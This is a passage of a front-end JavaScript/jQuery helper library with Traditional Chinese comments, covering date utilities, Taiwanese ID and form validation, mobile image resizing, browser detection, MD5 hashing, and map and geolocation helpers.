document.addEventListener("touchstart", function() {}, false);
//解決IOS :active失效
/*
if(browser_version().line || browser_version().fbapp || browser_version().weixin ){
	$(function(){
		if($("input[type=file]").length > 0){
			if(browser_version().line){
				alert("您正使用的LINE瀏覽器不允許啟用上傳照片與拍照功能，建議使用系統內建瀏覽器。");
			}else if(browser_version().fbapp){
				alert("您正使用的FB瀏覽器不允許啟用上傳照片與拍照功能，建議使用系統內建瀏覽器");
			}else if(browser_version().weixin){
				alert("您正使用微信瀏覽器不允許啟用上傳照片與拍照功能，建議使用系統內建瀏覽器");
			}
		}
	})

}
*/
$("img[style]").attr("style",function(){
	var style = ($(this).attr("style").indexOf("max-width") >= 0) ? $(this).attr("style") : $(this).attr("style")+";max-width:100%;height: auto;";
	return style
})
		
if( $("form[method=GET]").length > 0 || $('form:not([method])').length > 0 ){
	alert("表單禁止使用GET方式傳送任何資料");
}

//返回日期區間, date_range("2018-09-24", "2018-09-27")
function date_range(startDate, stopDate ) {

var listDate = [];
var dateMove = new Date(startDate);
var strDate = startDate;
while (strDate < stopDate){
  var strDate = dateMove.toISOString().slice(0,10);
  listDate.push(strDate);
  dateMove.setDate(dateMove.getDate()+1);
};
return listDate
}


//驗證身份證字號
function ValidateID(id){
    var city = new Array(1, 10, 19, 28, 37, 46, 55, 64, 39, 73, 82, 2, 11, 20, 48, 29, 38, 47, 56, 65, 74, 83, 21, 3, 12, 30);
    id = id.toUpperCase();
    // 使用「正規表達式」檢驗格式
    if (!id.match(/^[A-Z]\d{9}$/) && !id.match(/^[A-Z][A-D]\d{8}$/)) {
		return false;
    }
    else {
        var total = 0;
        if (id.match(/^[A-Z]\d{9}$/)) { //身分證字號
            //將字串分割為陣列(IE必需這麼做才不會出錯)
            id = id.split('');
            //計算總分
            total = city[id[0].charCodeAt(0) - 65];
            for (var i = 1; i <= 8; i++) {
                total += eval(id[i]) * (9 - i);
            }
        } else { // 外來人口統一證號
            //將字串分割為陣列(IE必需這麼做才不會出錯)
            id = id.split('');
            //計算總分
            total = city[id[0].charCodeAt(0) - 65];
            // 外來人口的第2碼為英文A-D(10~13)，這裡把他轉為區碼並取個位數，之後就可以像一般身分證的計算方式一樣了。
            id[1] = id[1].charCodeAt(0) - 65;
            for (var i = 1; i <= 8; i++) {
                total += eval(id[i]) * (9 - i);
            }
        }
        //補上檢查碼(最後一碼)
        total += eval(id[9]);
        //檢查比對碼(餘數應為0);
        if (total % 10 == 0) {
            return true;
        }
        else {
            return false;
        }
    }
}


//修正:active部分機型有錯誤
$(document).on('click', "input,textarea", function (event) {
  var target = this;
  setTimeout(function(){
	if (typeof target.scrollIntoViewIfNeeded !== "undefined" || typeof target.scrollIntoViewIfNeeded !== "undefined"){
		target.scrollIntoViewIfNeeded();
	}     
  },400);
}).on('keyup', "input", function (event) {
  //keydown對android search沒作用	
	if (event.which == 13 && browser_version().mobile) {
		//能避免ios軟鍵盤縮不回去
		document.activeElement.blur();
	}
})


/*
token與value取得方式, P.S 注意ajax_pub已內建
var temp = gettoken_value();
var value = temp.value;
var token = temp.token;	
*/
function gettoken_value(){
	var str = guid();
	return {"value":str,"token":eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0(0(1))',2,2,'md5|str'.split('|'),0,{}))
	};
}

//HTML 內建 base64編碼
function utf8_to_b64(str) {
    return window.btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode(parseInt(p1, 16))
    }))
}

//HTML 內建 base64解碼
function b64_to_utf8(str) {
    return decodeURIComponent(Array.prototype.map.call(window.atob(str), function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
    }).join(''))
}




/* 如果上傳圖檔功能是給手機專門用的, 需要特別處理safari旋轉問題
<input type="file" onchange="selectFileImage(this,1024,1024,'textarea[name=file0]','[name=photo2]','mobile',function(){callback()})"  />
selectFileImage(this,最大寬,最大高,'存放base64文字的選擇器','預覽base64縮圖的選擇器','rwd就是保留原本照片/mobile就是刪除原本照片',縮圖後要執行的function)
如果要用這涵數, 必須額外載入exif.js
這函數匯出base64後, 就會把原本的file清除
*/
function selectFileImage(fileObj,max_width,max_height,dom,preview,device,events) {  
	var deferredObj = $.Deferred();
    var file = fileObj.files['0'];  
    //图片方向角 added by lzk  
    var Orientation = null;  
	
      
    if (file) {   
        var rFilter = /^(image\/jpeg|image\/png)$/i; // 检查图片格式  
        if (!rFilter.test(file.type)) {  
			showAlert("請上傳JPG或PNG圖檔");
			location.reload();
        }  
		if (typeof EXIF == "undefined" || typeof MegaPixImage == "undefined"){
			showAlert("請載入新版exif.js");
			return false
		}
	
			
        EXIF.getData(file, function() {  
            EXIF.getAllTags(this);    
            Orientation = EXIF.getTag(this, 'Orientation');  
        });  
          
        var oReader = new FileReader();  
        oReader.onload = function(e) {  
            var image = new Image();  
            image.src = e.target.result;  
            image.onload = function() {  
                var expectWidth = this.naturalWidth;  
                var expectHeight = this.naturalHeight;  
                  
                if (this.naturalWidth > this.naturalHeight && this.naturalWidth > max_width) {  
                    expectWidth = max_width;  
                    expectHeight = expectWidth * this.naturalHeight / this.naturalWidth;  
                } else if (this.naturalHeight > this.naturalWidth && this.naturalHeight > max_height) {  
                    expectHeight = max_height;  
                    expectWidth = expectHeight * this.naturalWidth / this.naturalHeight;  
                }  
      
                var canvas = document.createElement("canvas");  
                var ctx = canvas.getContext("2d");  
                canvas.width = expectWidth;  
                canvas.height = expectHeight;  
                ctx.drawImage(this, 0, 0, expectWidth, expectHeight);  
    
                  
                var base64 = null;  
			
				if(browser_version().android || browser_version().ios){
					var mpImg = new MegaPixImage(image);
						mpImg.render(canvas, {  						
							maxWidth: max_width,  
							maxHeight: max_height,  
							quality: 0.92,  
							orientation: Orientation  
						});  
                }      
                base64 = canvas.toDataURL("image/jpeg", 0.92); 
				$(dom).val(base64);
				deferredObj.resolve();
				
                if(typeof events == "function"){					
					deferredObj.done(function(){
						events();
					});
				}				
				if(preview){
					if($(preview)[0].tagName == "IMG")
						$(preview).attr("src",base64);
					else
						$(preview).css({"background-image":"url("+base64+")"});
				}
            };  
        };  
        oReader.readAsDataURL(file);
		if(device == "mobile"){
			$(fileObj).val("");
		}
				
    }  
}  

//有的XML或JSON在串接時, 來源帶有編碼, 可以用這樣轉回來
function htmlDecodeByRegExp(str){  
    var s = "";
    if(str.length == 0) return "";
    s = str.replace(/&amp;/g,"&");
    s = s.replace(/&lt;/g,"<");
    s = s.replace(/&gt;/g,">");
    s = s.replace(/&nbsp;/g," ");
    s = s.replace(/&#39;/g,"\'");
    s = s.replace(/&quot;/g,"\"");
    return s;  
}

/*
if(browser_version().line || browser_version().fbapp || browser_version().weixin ){
	if(browser_version().line){
		alert("您正使用LINE瀏覽器，建議使用系統內建瀏覽器。否則有些功能無法正常使用");
	}else if(browser_version().fbapp){
		alert("您正使用FB瀏覽器，建議使用系統內建瀏覽器。否則有些功能無法正常使用");
	}else if(browser_version().fbapp){
		alert("您正使用微信瀏覽器，建議使用系統內建瀏覽器。否則有些功能無法正常使用");
	}
}
*/
function browser_version(){
    var u = navigator.userAgent, app = navigator.appVersion;
    var ua = navigator.userAgent.toLowerCase();

    return { //偵測移動端瀏覽器版本信息
        trident: u.indexOf('Trident') > -1, //IE 核心
        presto: u.indexOf('Presto') > -1, //opera 核心
        webKit: u.indexOf('AppleWebKit') > -1, //Apple, google 核心
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //Firefox 核心
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //行動裝置
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android或uc瀏覽器
        iPhone: u.indexOf('iPhone') > -1, //是否為iPhone或者QQHD瀏覽器
        iPad: u.indexOf('iPad') > -1, //是否iPad
        webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
        iosv: u.substr(u.indexOf('iPhone OS') + 9, 3),//ios版本
        weixin: ua.match(/MicroMessenger/i) == "micromessenger",//微信瀏覽器
        fbapp: u.indexOf('FBAV') > -1,//Facebook App內瀏覽器
        line: u.indexOf('Line') > -1//Line內瀏覽器
    };
}


//密碼複雜度,至少有英數，至少8碼
function ValidatePasswd(str){
    var re = /^(?=.*[a-z])(?=.*\d).{8,}$/;
    return re.test(str);
}

//個資法, 如果有傳X，代表前後各要保留幾位數
function substr_cut(str,x) { 
	var x = (x) ? x : round(str.length/3,0);
	var len = str.length-x-x;
	var xing = '';
	for (var i=0;i<len;i++) {
	xing+='*';
	}
	return (str.length == 2) ? str.substring(0,1)+"*":str.substring(0,x)+xing+str.substring(str.length-x);
}

//新增項目至下拉選單
//addOption("pc_select","pc","電腦")
function addOption(selectID,value,text) {
    var obj = $("#" + selectID + "");
    $("<option></option>").val(value).text(text).appendTo(obj);
}

//參數可以是空的(預設今天)，或者指定日期如2016-06-06。會返回本週日,本週六,本月首日,本月末日,上月首日
function dateCollections(date){
	var arr =(date) ? date.split("-") : [];
	var nowDate = (date) ? new Date(arr[0],arr[1]-1,arr[2]) : new Date();
    var nowDay = nowDate.getDay(); 
    nowDay = nowDay === 0 ? 7 : nowDay;
	var timestampOfDay = 1000*60*60*24;
    var fullYear = nowDate.getFullYear();
    var month = nowDate.getMonth();
    var date = nowDate.getDate();
    var endOfMonth = new Date(fullYear, month+1, 0).getDate(); 

	var this_Sunday = (nowDay == 7) ? getFullDate(nowDate) : getFullDate( +nowDate - (nowDay)*timestampOfDay ); //本週日
	var this_Saturday = GetDateStr(+6,this_Sunday); //本週六
	var StartOfMonth = getFullDate( nowDate.setDate(1) );
	var EndOfMonth = getFullDate( nowDate.setDate(endOfMonth) );
	
    if(month==0){
        month = 12;
        fullYear = fullYear - 1;
    }else if (month < 10) {
        month = "0" + month;
    }	
	var pre_StartOfMonth = fullYear + "-" + month + "-" + "01";//上個月第一天
	//上個月最後一天：本月最後天(上個月第一天)

	

    return { this_Sunday: this_Sunday, this_Saturday: this_Saturday, StartOfMonth: StartOfMonth,EndOfMonth: EndOfMonth,pre_StartOfMonth:pre_StartOfMonth};
}

//N天後或N天前, GetDateStr(+-5) 或 特定日期 GetDateStr(+-5,"2016-05-05");
function GetDateStr(AddDayCount,date) {
	var arr =(date) ? date.split("-") : [];
    var dd = (date) ? new Date(arr[0],arr[1]-1,arr[2]) : new Date();
    dd.setDate(dd.getDate()+AddDayCount);//获取AddDayCount天后的日期
	//console.log(datetime_to_unix("2016-01-01 12:00:00").getDate())
    var y = dd.getFullYear();

    var m = (dd.getMonth()+1 < 10) ? "0"+(dd.getMonth()+1) : dd.getMonth()+1 ;
    var d = (dd.getDate() < 10) ? "0"+dd.getDate() : dd.getDate() ;
    return y+"-"+m+"-"+d;
}

//取得上一頁網址，在cordova可使用
function previouspage(){
	var previouspage = ""; 
	if (localStorage.getItem("page") !== 'undefined' && localStorage.getItem("page") !== null ) {
		previouspage = localStorage.getItem("page");
	}
	var currentPage = getfilename()+getfilename("urlParam");
	localStorage.setItem('page', currentPage);
	return previouspage;
}

// 時間差 DateDiff("2015-01-01 18:00:00","2015-01-01 20:55:00", "h");
function DateDiff(startTime, endTime, diffType) {

    startTime = startTime.replace(/\-/g, "/");
    endTime = endTime.replace(/\-/g, "/");
 

    diffType = diffType.toLowerCase();
    var sTime = new Date(startTime); 
    var eTime = new Date(endTime); 
    var divNum = 1;
    switch (diffType) {
        case "s":
            divNum = 1000;
            break;
        case "i":
            divNum = 1000 * 60;
            break;
        case "h":
            divNum = 1000 * 3600;
            break;
        case "d":
            divNum = 1000 * 3600 * 24;
            break;
        default:
            break;
    }
    return parseInt((eTime.getTime() - sTime.getTime()) / parseInt(divNum));
}


//預設勾選方塊, box_default(要比對的字串,checkbox的name,間格符號);
//box_default("A,B,C","city","@")
function box_default(str,box_dom,icon){
	var icon = (icon) ? icon : "," ; 
	if(typeof str !== "undefined"){
		var str_arr = str.split(icon)
		$("input[type=checkbox][name="+box_dom+"]").each(function(){
			if(str_arr.indexOf($(this).val()) >= 0){
				$(this).prop('checked', true);	
			}	
		})
	}
}	
		

//dist=1為10KM，給經緯度與角度(0-360)後，推算新地點
//如果原地標沒有角度資訊，heading填90新地點會在正右方，heading填180新地點會在正下方
//如果原地標有角度資訊，代表視角是面對原地標，heading可填入Math.abs(角度-180)，這樣剛好就是對面原地標往後退
function getlocationforheading(lat,lng,heading, dist) {
   dist = dist / 6371;  
   heading = radians(heading);  

   var lat1 = radians(lat), lon1 = radians(lng);

   var lat2 = Math.asin(Math.sin(lat1) * Math.cos(dist) + 
                        Math.cos(lat1) * Math.sin(dist) * Math.cos(heading));

   var lon2 = lon1 + Math.atan2(Math.sin(heading) * Math.sin(dist) *
                                Math.cos(lat1), 
                                Math.cos(dist) - Math.sin(lat1) *
                                Math.sin(lat2));

   if (isNaN(lat2) || isNaN(lon2)) return null;
   return { lat:  degrees(lat2), lng: degrees(lon2) }
}

//兩點之間的方向，可以做離線指針定位
function getBearing(startLat,startLong,endLat,endLong){
  startLat = radians(startLat);
  startLong = radians(startLong);
  endLat = radians(endLat);
  endLong = radians(endLong);

  var dLong = endLong - startLong;

  var dPhi = Math.log(Math.tan(endLat/2.0+Math.PI/4.0)/Math.tan(startLat/2.0+Math.PI/4.0));
  if (Math.abs(dLong) > Math.PI){
    if (dLong > 0.0)
       dLong = -(2.0 * Math.PI - dLong);
    else
       dLong = (2.0 * Math.PI + dLong);
  }

  return (degrees(Math.atan2(dLong, dPhi)) + 360.0) % 360.0;
}

function radians(n) {
  return n * (Math.PI / 180);
}
function degrees(n) {
  return n * (180 / Math.PI);
}



//取的目前檔案名稱或所有參數
//檔名 getfilename() -> 123.html
//參數列 getfilename("urlParam") -> ?name=999
function getfilename(x){
	var page ;
	if(!x){
		var path = window.location.pathname;
		page = path.split("/").pop();	
	}else if(x == "urlParam"){
		page = decodeURI(document.location.search);
	}
	return page;
}


//取得md5
function md5(str){
	(function($){'use strict';function safe_add(x,y){var lsw=(x&0xFFFF)+(y&0xFFFF),msw=(x>>16)+(y>>16)+(lsw>>16);return(msw<<16)|(lsw&0xFFFF);}
	function bit_rol(num,cnt){return(num<<cnt)|(num>>>(32-cnt));}
	function md5_cmn(q,a,b,x,s,t){return safe_add(bit_rol(safe_add(safe_add(a,q),safe_add(x,t)),s),b);}
	function md5_ff(a,b,c,d,x,s,t){return md5_cmn((b&c)|((~b)&d),a,b,x,s,t);}
	function md5_gg(a,b,c,d,x,s,t){return md5_cmn((b&d)|(c&(~d)),a,b,x,s,t);}
	function md5_hh(a,b,c,d,x,s,t){return md5_cmn(b^c^d,a,b,x,s,t);}
	function md5_ii(a,b,c,d,x,s,t){return md5_cmn(c^(b|(~d)),a,b,x,s,t);}
	function binl_md5(x,len){x[len>>5]|=0x80<<((len)%32);x[(((len+64)>>>9)<<4)+14]=len;var i,olda,oldb,oldc,oldd,a=1732584193,b=-271733879,c=-1732584194,d=271733878;for(i=0;i<x.length;i+=16){olda=a;oldb=b;oldc=c;oldd=d;a=md5_ff(a,b,c,d,x[i],7,-680876936);d=md5_ff(d,a,b,c,x[i+1],12,-389564586);c=md5_ff(c,d,a,b,x[i+2],17,606105819);b=md5_ff(b,c,d,a,x[i+3],22,-1044525330);a=md5_ff(a,b,c,d,x[i+4],7,-176418897);d=md5_ff(d,a,b,c,x[i+5],12,1200080426);c=md5_ff(c,d,a,b,x[i+6],17,-1473231341);b=md5_ff(b,c,d,a,x[i+7],22,-45705983);a=md5_ff(a,b,c,d,x[i+8],7,1770035416);d=md5_ff(d,a,b,c,x[i+9],12,-1958414417);c=md5_ff(c,d,a,b,x[i+10],17,-42063);b=md5_ff(b,c,d,a,x[i+11],22,-1990404162);a=md5_ff(a,b,c,d,x[i+12],7,1804603682);d=md5_ff(d,a,b,c,x[i+13],12,-40341101);c=md5_ff(c,d,a,b,x[i+14],17,-1502002290);b=md5_ff(b,c,d,a,x[i+15],22,1236535329);a=md5_gg(a,b,c,d,x[i+1],5,-165796510);d=md5_gg(d,a,b,c,x[i+6],9,-1069501632);c=md5_gg(c,d,a,b,x[i+11],14,643717713);b=md5_gg(b,c,d,a,x[i],20,-373897302);a=md5_gg(a,b,c,d,x[i+5],5,-701558691);d=md5_gg(d,a,b,c,x[i+10],9,38016083);c=md5_gg(c,d,a,b,x[i+15],14,-660478335);b=md5_gg(b,c,d,a,x[i+4],20,-405537848);a=md5_gg(a,b,c,d,x[i+9],5,568446438);d=md5_gg(d,a,b,c,x[i+14],9,-1019803690);c=md5_gg(c,d,a,b,x[i+3],14,-187363961);b=md5_gg(b,c,d,a,x[i+8],20,1163531501);a=md5_gg(a,b,c,d,x[i+13],5,-1444681467);d=md5_gg(d,a,b,c,x[i+2],9,-51403784);c=md5_gg(c,d,a,b,x[i+7],14,1735328473);b=md5_gg(b,c,d,a,x[i+12],20,-1926607734);a=md5_hh(a,b,c,d,x[i+5],4,-378558);d=md5_hh(d,a,b,c,x[i+8],11,-2022574463);c=md5_hh(c,d,a,b,x[i+11],16,1839030562);b=md5_hh(b,c,d,a,x[i+14],23,-35309556);a=md5_hh(a,b,c,d,x[i+1],4,-1530992060);d=md5_hh(d,a,b,c,x[i+4],11,1272893353);c=md5_hh(c,d,a,b,x[i+7],16,-155497632);b=md5_hh(b,c,d,a,x[i+10],23,-1094730640);a=md5_hh(a,b,c,d,x[i+13],4,681279174);d=md5_hh(d,a,b,c,x[i],11,-358537222);c=md5_hh(c,d,a,b,x[i+3],16,-722521979);b=md5_hh(b,c,d,a,x[i+6],23,76029189);a=md5_hh(a,b,c,d,x[i+9],4,-640364487);d=md5_hh(d,a,b,c,x[i+12],11,-421815835);c=md5_hh(c,d,a,b,x[i+15],16,530742520);b=md5_hh(b,c,d,a,x[i+2],23,-995338651);a=md5_ii(a,b,c,d,x[i],6,-198630844);d=md5_ii(d,a,b,c,x[i+7],10,1126891415);c=md5_ii(c,d,a,b,x[i+14],15,-1416354905);b=md5_ii(b,c,d,a,x[i+5],21,-57434055);a=md5_ii(a,b,c,d,x[i+12],6,1700485571);d=md5_ii(d,a,b,c,x[i+3],10,-1894986606);c=md5_ii(c,d,a,b,x[i+10],15,-1051523);b=md5_ii(b,c,d,a,x[i+1],21,-2054922799);a=md5_ii(a,b,c,d,x[i+8],6,1873313359);d=md5_ii(d,a,b,c,x[i+15],10,-30611744);c=md5_ii(c,d,a,b,x[i+6],15,-1560198380);b=md5_ii(b,c,d,a,x[i+13],21,1309151649);a=md5_ii(a,b,c,d,x[i+4],6,-145523070);d=md5_ii(d,a,b,c,x[i+11],10,-1120210379);c=md5_ii(c,d,a,b,x[i+2],15,718787259);b=md5_ii(b,c,d,a,x[i+9],21,-343485551);a=safe_add(a,olda);b=safe_add(b,oldb);c=safe_add(c,oldc);d=safe_add(d,oldd);}
	return[a,b,c,d];}
	function binl2rstr(input){var i,output='';for(i=0;i<input.length*32;i+=8){output+=String.fromCharCode((input[i>>5]>>>(i%32))&0xFF);}
	return output;}
	function rstr2binl(input){var i,output=[];output[(input.length>>2)-1]=undefined;for(i=0;i<output.length;i+=1){output[i]=0;}
	for(i=0;i<input.length*8;i+=8){output[i>>5]|=(input.charCodeAt(i/8)&0xFF)<<(i%32);}
	return output;}
	function rstr_md5(s){return binl2rstr(binl_md5(rstr2binl(s),s.length*8));}
	function rstr_hmac_md5(key,data){var i,bkey=rstr2binl(key),ipad=[],opad=[],hash;ipad[15]=opad[15]=undefined;if(bkey.length>16){bkey=binl_md5(bkey,key.length*8);}
	for(i=0;i<16;i+=1){ipad[i]=bkey[i]^0x36363636;opad[i]=bkey[i]^0x5C5C5C5C;}
	hash=binl_md5(ipad.concat(rstr2binl(data)),512+data.length*8);return binl2rstr(binl_md5(opad.concat(hash),512+128));}
	function rstr2hex(input){var hex_tab='0123456789abcdef',output='',x,i;for(i=0;i<input.length;i+=1){x=input.charCodeAt(i);output+=hex_tab.charAt((x>>>4)&0x0F)+
	hex_tab.charAt(x&0x0F);}
	return output;}
	function str2rstr_utf8(input){return unescape(encodeURIComponent(input));}
	function raw_md5(s){return rstr_md5(str2rstr_utf8(s));}
	function hex_md5(s){return rstr2hex(raw_md5(s));}
	function raw_hmac_md5(k,d){return rstr_hmac_md5(str2rstr_utf8(k),str2rstr_utf8(d));}
	function hex_hmac_md5(k,d){return rstr2hex(raw_hmac_md5(k,d));}
	jQuery.md5=function(string,key,raw){if(!key){if(!raw){return hex_md5(string);}else{return raw_md5(string);}}
	if(!raw){return hex_hmac_md5(key,string);}else{return raw_hmac_md5(key,string);}};}(typeof jQuery==='function'?jQuery:this));return jQuery.md5(str);
}


//去除json鎮列重複,以某節點為依據, 用法如下
// uniqueByKey($.parseJSON(total_item), "name")
function uniqueByKey(array, key) {
	var categories = [];	
	$.each(array, function(index, value) {	
		if ($.inArray(value[key], categories) === -1) {
			categories.push(value[key]);
		}
	});
	return categories;
}

//碼錶功能，將秒轉為時分秒
function secondsToTime(secs){
	
    var hours = Math.floor(secs / (60 * 60));
   
    var divisor_for_minutes = secs % (60 * 60);
    var minutes = Math.floor(divisor_for_minutes / 60);
 
    var divisor_for_seconds = divisor_for_minutes % 60;
    var seconds = Math.ceil(divisor_for_seconds);
   
    var obj = {
        "h": (hours < 10) ? "0"+hours : hours,
        "m": (minutes < 10) ? "0"+minutes : minutes,
        "s": (seconds < 10) ? "0"+seconds : seconds
    };
    return (secs <= 0) ? {"h":"00","m":"00","s":"00"} :obj;
}

//產生GUUID
function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

//清除ckeditor內的dom style，用法: remove_ckeditor_style('textareaDefault1','a,p,img,div');
function remove_ckeditor_style(id,tag){
	var ckeditor_text = CKEDITOR.instances[id].getData();
	var dom = $("<div>").append($.parseHTML(ckeditor_text));
	dom.find(tag).removeAttr('style');
	dom = dom.html();
	CKEDITOR.instances[id].setData(dom) 	
}

/*
表單驗證方式
if(validateEmail(參數) == false)
event.preventDefault();	
*/	
//驗證EMAIL
function validateEmail(email) {
    var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i;
    return re.test(email);
}
//驗證數字，如果有傳floats這參數，代表浮點數也可以過
function ValidateNumber(pnumber,floats){
    var re = (floats) ? /^[+\-]?\d+(.\d+)?$/ : /^\d+$/;
    return re.test(pnumber);
}

//驗證手機格式
function ValidateMobile(pnumber){
    var re = /^[09]{2}[0-9]{8}$/;
    return re.test(pnumber);
}

//驗證日期
function ValidateYYYYMMDD(str) {
	//var date_regex = /^(0[1-9]|1[0-2])\/(0[1-9]|1\d|2\d|3[01])\/(19|20)\d{2}$/ ;
	var date_regex = /^(19|20)\d{2}\-(0[1-9]|1[0-2])\-(0[1-9]|1\d|2\d|3[01])$/ ;
	//if(!(date_regex.test(str)))
	return (date_regex.test(str))
	//else
	//return true;
}

//物件，從value反找key
// var max_types = {"A": "小明", "B": "小強", "C": "小華"};
// max_types.getKeyByValue("小明"); // 傳回A
/* 暫停使用，在深度後台會有衝突
Object.prototype.getKeyByValue = function( value ) {
	for( var prop in this ) {
		if( this.hasOwnProperty( prop ) ) {
			if( this[ prop ] === value )
				return prop;
			}
		}
}	
*/
					
//計算ibeacon距離，txPower要問廠商，通常是-59，rssi也帶負值即可
function distance_ibeacon(txPower, rssi) { 	
    var ratio = rssi*1.0/txPower;
	if (ratio < 1.0) {
		return Math.pow(ratio,10);
	}
	else {
		var accuracy =  (0.89976)*Math.pow(ratio,7.7095) + 0.111;    
		return accuracy;
	}	
}
	

function showAlert(message,title,submits) {
	var title = (title) ? title : "提示訊息";
    var submits = (submits) ? submits : "確認";
    if (navigator.notification && navigator.notification.alert)
    {
        navigator.notification.alert(
            message,
            function() {
            },
            title,
            submits);
    }
    else
    {
		if(browser_version().line || browser_version().fbapp || browser_version().weixin){
			window.alert(message);
		}else{
			var iframe = document.createElement("IFRAME");    
			iframe.style.display = "none";    
			iframe.setAttribute("src", 'data:text/plain,');    
			document.documentElement.appendChild(iframe);    
			var alertFrame = window.frames[0];    
			var iwindow = alertFrame.window;    
			if (iwindow == undefined) {    
				iwindow = alertFrame.contentWindow;    
			}    
			iwindow.alert(message);    
			iframe.parentNode.removeChild(iframe); 				
		}
	

    }
}

//getUrlParam("id") 或 getUrlParam("id","網址")，不需要特别编码
function getUrlParam(name,url) {	
  var reg = RegExp ('[?&]' + name.replace (/([[\]])/, '\\$1') + '=([^&#]*)');
  var r = (url) ? (url.match (reg) || ['', ''])[1] : decodeURI((window.location.href.match (reg) || ['', ''])[1]);
  return r;
}

//去除特殊字元,連到google map app的title要處理
function stripscript(s){ 
	var pattern = new RegExp("[`~!@#$^&*()=|{}':;',\\[\\].<>/?~！@#￥……&*（）——|{}【】‘；：”“'。，、？]") 
	var rs = ""; 
	for (var i = 0; i < s.length; i++) { 
		rs = rs+s.substr(i, 1).replace(pattern, ''); 
	} 
	return rs; 
}
function escape_new(str){  
    return escape(str).replace(/\+/g,'%2B').replace(/\#/g,'%23').replace(/\&/g,'%26');  
}  
// getTime() 方法可返回距 1970 年 1 月 1 日之間的毫秒數
// getFullDate( (new Date()).getTime() ); //不常用到 
function getFullDate(targetDate) {
    var D, y, m, d;
    if (targetDate) {
        D = new Date(targetDate);
        y = D.getFullYear();
        m = D.getMonth() + 1;
        d = D.getDate();
    } else {
        y = fullYear;
        m = month;
        d = date;
    }
    m = m > 9 ? m : '0' + m;
    d = d > 9 ? d : '0' + d;

    return y + '-' + m + '-' + d;
}
	
//unix轉日期中文
function unix_to_datetime(unix) {
    var now = new Date(parseInt(unix) * 1000);
    return now.toLocaleString().replace(/年|月/g, "-").replace(/日/g, " ");
}

//日期轉星期, 輸入"2016-01-01"格式
function date_to_week(date){
    var w = new Date(date).getDay();
	var weekday = new Array(7);
	weekday[0]="日";
	weekday[1]="一";
	weekday[2]="二";
	weekday[3]="三";
	weekday[4]="四";
	weekday[5]="五";
    weekday[6]="六";	
	return weekday[w];
}

//格式化日期 TO unix，輸入格式2014-06-09 18:00:00
function datetime_to_unix(datetime){
    var tmp_datetime = datetime.replace(/:/g,'-');
    tmp_datetime = tmp_datetime.replace(/ /g,'-');
    var arr = tmp_datetime.split("-");
    var now = new Date(Date.UTC(arr[0],arr[1]-1,arr[2],arr[3]-8,arr[4],arr[5]));
    return parseInt(now.getTime()/1000);
}

//var d = new Date("October 13, 2014 11:13:00");
//var d = new Date();
//var n = d.getTime();
//console.log(now_time(d))
//返回yyyy-MM-dd HH:mm:ss，也可以傳入new Date()格式，如果不傳入就是今天時間
function now_time(d){
	Number.prototype.padLeft = function(base,chr){
	   var  len = (String(base || 10).length - String(this).length)+1;
	   return len > 0? new Array(len).join(chr || '0')+this : this;
	}
  var d = (d) ? d : new Date();
  dformat = [ d.getFullYear(),(d.getMonth()+1).padLeft(),d.getDate().padLeft()].join('-')+' ' +[ d.getHours().padLeft(),d.getMinutes().padLeft(),d.getSeconds().padLeft()].join(':');	
  return dformat;
}


//使用方式 getISODateTime("這邊要輸入yyyy-MM-dd HH:mm:ss完整格式", "yyyy-MM-dd")
function getISODateTime(date, format){
	if(date.split(" ").length == 1){ 
		var tmp_datetime = date.replace(/:/g,'-');
		tmp_datetime = tmp_datetime.replace(/ /g,'-');
		var arr = tmp_datetime.split("-");
		date = new Date(Date.UTC(arr[0],arr[1]-1,arr[2],00,00,00));		
	}	

    if (!date) return;
    if (!format) format = "yyyy-MM-dd";
    switch(typeof date) {		
        case "string":			
            date = new Date(date.replace(/\-/g, "/"));
            break;
        case "number":
            date = new Date(date);
            break;
    } 
	
    if (!date instanceof Date) return;
    var dict = {
        "yyyy": date.getFullYear(),
        "M": date.getMonth() + 1,
        "d": date.getDate(),
        "H": date.getHours(),
        "m": date.getMinutes(),
        "s": date.getSeconds(),
        "MM": ("" + (date.getMonth() + 101)).substr(1),
        "dd": ("" + (date.getDate() + 100)).substr(1),
        "HH": ("" + (date.getHours() + 100)).substr(1),
        "mm": ("" + (date.getMinutes() + 100)).substr(1),
        "ss": ("" + (date.getSeconds() + 100)).substr(1)
    };    
	
    return format.replace(/(yyyy|MM?|dd?|HH?|ss?|mm?)/g, function() {
        return dict[arguments[0]];
    }); 
}
/*
第三個參數[選填] 標題. 可為空值
第四個參數[選填] d開車/r採用大眾運輸/w步行方式/b騎行方式

如果是經緯度有3種用法
papago(24.279617,120.621191);
papago(24.279617,120.621191,"顯示標題");
papago(24.279617,120.621191,"顯示標題","d");
如果是地址有2種用法
papago(地址);
papago(地址,"d")
*/

function papago(var1,var2,var3,var4){
	var regex = /^[0-9.]+$/;
	var mode = var4 || "";
	var temp1 = (mode == "") ? "q":"daddr";
	var app = document.URL.indexOf( 'http://' ) === -1 && document.URL.indexOf( 'https://' ) === -1;
	var label = var3 || var1+","+var2;
	var map = "https://maps.google.com/maps?"+temp1+"="+var1+","+var2+"("+label+")&dirflg="+mode+"&openExternalBrowser=1";
	if(!var2){
		map = "https://maps.google.com/maps?q="+var1+"&openExternalBrowser=1";
	}else if(!regex.test(var1) && !regex.test(var2)){
		map = "https://maps.google.com/maps?daddr="+var1+"&dirflg="+var2+"&openExternalBrowser=1";
	}
	
	
	if (app){	
		if(device.platform == "Android" && mode == ""){
			if(!var2){
				map = "geo:0,0?q="+var1;
			}else{
